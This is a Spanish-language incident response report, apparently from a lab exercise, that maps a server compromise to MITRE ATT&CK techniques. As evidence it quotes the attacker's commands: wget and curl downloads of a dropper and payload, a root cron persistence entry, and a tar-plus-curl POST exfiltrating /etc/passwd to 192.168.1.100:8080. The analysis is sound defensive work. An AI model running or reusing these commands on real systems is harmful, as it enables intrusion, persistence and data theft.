# 🗺️ Análisis MITRE ATT&CK — Cadena de Ataque Completa
## 4geeks-server Incident Response — Junio 2025

---

## Diagrama de la Cadena de Ataque

```
┌──────────────────────────────────────────────────────────────────┐
│                    ACTOR EXTERNO (192.168.1.100)                 │
└──────────────────────────┬───────────────────────────────────────┘
                           │ Phishing (T1566)
                           │ "run the script, it's clean"
                           ▼
┌──────────────────────────────────────────────────────────────────┐
│               CUENTA "reports" (UID 1001, tty1)                  │
│               Credencial: reports:reports123 (T1552.001)         │
└──────────────────────────┬───────────────────────────────────────┘
                           │ User Execution (T1204.002)
                           │ wget install.sh → chmod +x → ./install.sh
                           ▼
┌──────────────────────────────────────────────────────────────────┐
│                     DROPPER (install.sh)                         │
│               Ingress Tool Transfer (T1105)                      │
│        curl http://192.168.1.100/payload.bin → /tmp/.temp/payload│
└──────────────────────────┬───────────────────────────────────────┘
                           │ Exploitation for Priv. Esc. (T1068)
                           │ Kernel LPE — 5.4.0-216 EOL
                           ▼
┌──────────────────────────────────────────────────────────────────┐
│                       ROOT (PRIVILEGIOS TOTALES)                 │
├──────────────────┬────────────────────────┬──────────────────────┤
│  PERSISTENCIA    │  ACCOUNT MANIPULATION  │  SCHEDULED TASK      │
│  Create Account  │  www-data shell        │  /etc/cron.d/        │
│  "hacker"        │  nologin → /bin/bash   │  sys-maintenance     │
│  (T1136.001)     │  (T1098)               │  (T1053.003)         │
└──────────────────┴────────────────────────┴──────┬───────────────┘
                                                   │ cada 15 min
                                                   ▼
┌──────────────────────────────────────────────────────────────────┐
│                    EXFILTRACIÓN RECURRENTE                       │
│  tar -czf /tmp/secrets.tgz /etc/passwd          (T1005)          │
│  curl -X POST ... http://192.168.1.100:8080/upload  (T1041)      │
│                                                                  │
│  ≈ 365 días × 96 ejecuciones/día ≈ 35,040 exfiltraciones        │
└──────────────────────────────────────────────────────────────────┘
```

---

## Técnicas Confirmadas

### TA0043 — Reconnaissance

#### T1598 — Phishing for Information
- **Confianza:** Alta
- **Evidencia:** `/home/reports/chat.txt` — mensaje de `unknown@externalmail.com`
- **Detalle:** El atacante obtuvo suficiente contexto operativo para enviar un mensaje creíble dirigido al usuario `reports` referenciando un "script" previamente enviado. Pretexto coherente con el rol de la cuenta (backups/reportes).
- **Artefacto clave:**
  ```
  From: unknown@externalmail.com
  Hey, run that script I sent you earlier.
  Don't worry, it's clean. Let me know once the backup finishes.
  ```

---

### TA0001 — Initial Access

#### T1566 — Phishing
- **Confianza:** Alta
- **Evidencia:** chat.txt (ver arriba)
- **Detalle:** No fue un phishing masivo de credenciales; fue un phishing de ejecución — el objetivo era que la víctima ejecutara un binario, no que entregara su contraseña directamente.

#### T1078 — Valid Accounts
- **Confianza:** Alta
- **Evidencia:** `auth.log` → login de `reports` el 23-jun-2025 14:07:53 desde `/dev/tty1`
- **Detalle:** El atacante (o la víctima actuando bajo el pretexto) operó con credenciales legítimas de la cuenta `reports`. La contraseña `reports123` estaba disponible en texto plano en `/opt/.archive/credentials.txt`.
- **Nota crítica:** El origen `/dev/tty1` (consola local de VirtualBox) **descarta T1190** (explotación de Apache/vsftpd) como vector de entrada.

---

### TA0006 — Credential Access

#### T1552.001 — Unsecured Credentials: Credentials In Files
- **Confianza:** Alta
- **Evidencia:** `/opt/.archive/credentials.txt` (root:root, 23-jun-2025, 19 bytes)
- **Contenido:** `reports:reports123`
- **Referenciado en:** `/home/reports/.note` (propiedad de **root** — escrito post-escalada)
  ```
  Reminder: new credentials for reports stored temporarily in /opt/.archive
  ```
- **Detalle:** El archivo fue creado el mismo día del compromiso. Que `.note` sea propiedad de root (no de `reports`) confirma que fue escrito por el proceso elevado del payload, posiblemente como nota de operaciones del atacante.

---

### TA0002 — Execution

#### T1204.002 — User Execution: Malicious File
- **Confianza:** Alta
- **Evidencia:** `bash_history` de `reports`:
  ```
  cat /opt/.archive/credentials.txt
  wget http://192.168.1.100/install.sh
  chmod +x install.sh
  ./install.sh
  nano backup.log
  ```
- **Detalle:** La víctima ejecutó `install.sh` de forma manual tras recibir la instrucción por phishing. El historial muestra también que primero leyó el archivo de credenciales, lo cual sugiere que el `.note` fue leído antes de (o durante) la sesión.

#### T1059.004 — Command and Scripting Interpreter: Unix Shell
- **Confianza:** Alta
- **Evidencia:** `install.sh` es un bash script; toda la cadena de ejecución ocurre en bash.

#### T1105 — Ingress Tool Transfer
- **Confianza:** Alta
- **Evidencia:**
  ```bash
  wget http://192.168.1.100/install.sh          # stage 1
  curl -s http://192.168.1.100/payload.bin ...  # stage 2 (dentro de install.sh)
  ```

---

### TA0004 — Privilege Escalation

#### T1068 — Exploitation for Privilege Escalation
- **Confianza:** Media-Alta (atribuida por eliminación)
- **Evidencia directa:** Ninguna — el binario `payload` no fue recuperado.
- **Evidencia indirecta:**
  - La cuenta `reports` no tiene acceso sudo, no pertenece a grupos privilegiados, no hay reglas sudoers personalizadas, no hay binarios SUID añadidos.
  - Las acciones posteriores (useradd, escritura en /etc/cron.d/, modificación de /etc/passwd) requieren privilegios de root.
  - El kernel 5.4.0-216 estaba fuera de soporte estándar sin parches ESM activos al momento del incidente.
  - Cuatro reinicios del sistema el 23-jun-2025 (12:55, 14:50, 15:23, 16:40) coinciden con la instalación de persistencia; sin mensajes de panic/oops en kern.log.
- **CVE:** No identificado.

---

### TA0003 — Persistence

#### T1136.001 — Create Account: Local Account
- **Confianza:** Alta
- **Evidencia:** `auth.log`:
  ```
  Jun 23 15:02:47 4geeks-server useradd[1899]: new group: name=hacker, GID=1002
  Jun 23 15:02:47 4geeks-server useradd[1899]: new user: name=hacker, UID=1002, 
    GID=1002, home=/home/hacker, shell=/bin/bash, from=/dev/tty1
  ```
- **Características:** Sin `authorized_keys`, hash de contraseña activo, home con solo archivos de skel — nunca usada interactivamente.

#### T1053.003 — Scheduled Task/Job: Cron
- **Confianza:** Alta
- **Evidencia:**
  - Archivo `/etc/cron.d/sys-maintenance` (fecha: 23-jun-2025, anómala)
  - Contenido: `*/15 * * * * root /usr/local/bin/backup2.sh`
  - Confirmado en syslog: `CRON[6088]: (root) CMD (/usr/local/bin/backup2.sh)` @ 02:30:01
  - Segunda ejecución: `CRON[6125]` @ 02:45:01 (intervalo de 15 min exacto)

---

### TA0005 — Defense Evasion

#### T1036.005 — Masquerading: Match Legitimate Name or Location
- **Confianza:** Alta
- **Evidencia:** El nombre `sys-maintenance` imita una tarea legítima de mantenimiento del sistema. Archivos vecinos legítimos en `/etc/cron.d/`: `e2scrub_all`, `logrotate`, `popularity-contest`. La diferencia de fecha (23-jun-2025 vs Feb-2020/Mar-2023) fue la señal que lo delató.

#### T1036 (variante) — Fabricación de log de cobertura
- **Confianza:** Alta
- **Evidencia:** `/home/reports/backup.log` escrito manualmente con `nano`, describe una exfiltración de `/etc/shadow` hacia `102.168.1.100:8080`. El typo en la IP (102 en lugar de 192) delata que fue tecleado a mano. La búsqueda global `find / -name "*.tgz" -o -name "*.tar.gz"` no encontró ningún archivo adicional, y el mtime de `/etc/shadow` se explica sin exfiltración (alta de contraseña de `hacker`).

#### T1098 — Account Manipulation
- **Confianza:** Alta
- **Evidencia:** Shell de `www-data` cambiada de `/usr/sbin/nologin` a `/bin/bash` en `/etc/passwd`.

---

### TA0009 — Collection

#### T1005 — Data from Local System
- **Confianza:** Alta
- **Evidencia:** `tar -czf /tmp/secrets.tgz /etc/passwd` (línea 2 de backup2.sh)
- **Verificación:** `tar -tvf /tmp/secrets.tgz` → único contenido: `etc/passwd` (root:root, 2025-06-23 15:02)

---

### TA0011 — Command and Control

#### T1071.001 — Application Layer Protocol: Web Protocols
- **Confianza:** Alta
- **Evidencia:**
  - Conexión `SYN_SENT` a 192.168.1.100:8080 visible en `netstat -tupnaw` (PID 2020/curl)
  - Confirmado en el script de exfiltración: `curl -X POST -F 'file=@/tmp/secrets.tgz' http://192.168.1.100:8080/upload`

---

### TA0010 — Exfiltration

#### T1041 — Exfiltration Over C2 Channel
- **Confianza:** Alta
- **Evidencia:** El mismo canal HTTP usado para C2 es el canal de exfiltración (POST multipart a `/upload`).
- **Frecuencia:** Cada 15 minutos durante ≈ 365 días.

---

## Técnicas Descartadas

| Técnica | ID | Razón del descarte |
|---|---|---|
| Exploit Public-Facing Application | T1190 | Origen tty1 (consola local, no red); access.log 0 bytes |
| Brute Force | T1110 | No hay evidencia en auth.log de intentos fallidos previos |
| SSH Authorized Keys | T1098.004 | Todos los authorized_keys revisados y vacíos |
| Kernel Modules | T1547.006 | lsmod limpio, /etc/ld.so.preload vacío |
| Web Shell | T1505.003 | Sin archivos en /var/www modificados, sin evidencia web |
| Lateral Movement | TA0008 | Sin evidencia de movimiento a otros hosts |

---

## Cobertura en MITRE ATT&CK Navigator

Para visualizar la cobertura en ATT&CK Navigator, importar la siguiente selección de técnicas:

```
T1598, T1566, T1078, T1552.001, T1204.002, T1059.004, T1105,
T1068, T1136.001, T1053.003, T1098, T1036.005, T1005, T1071.001, T1041
```

URL: https://mitre-attack.github.io/attack-navigator/

---

*Análisis realizado durante investigación Live IR — 4geeks-server — Junio 2026*
